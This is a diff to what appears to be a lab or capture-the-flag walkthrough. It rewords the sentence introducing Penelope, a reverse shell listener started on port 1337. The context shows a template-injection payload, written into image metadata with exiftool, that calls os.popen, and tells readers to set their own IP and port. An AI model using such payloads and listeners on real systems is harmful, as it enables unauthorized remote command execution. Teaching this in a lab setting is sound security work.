@@ -179,7 +179,7 @@ exiftool -Artist="{{ self.__init__.__globals__.__builtins__.__import__('os').pop
 
 Update the IP and port to your own.
 
-We start our Penelope listener, which upgrades the TTY on its own once a shell lands.
+We start Penelope, a reverse shell handler that upgrades the session to a full TTY on its own, and leave it listening on our port.
 
 ```
 penelope -p 1337
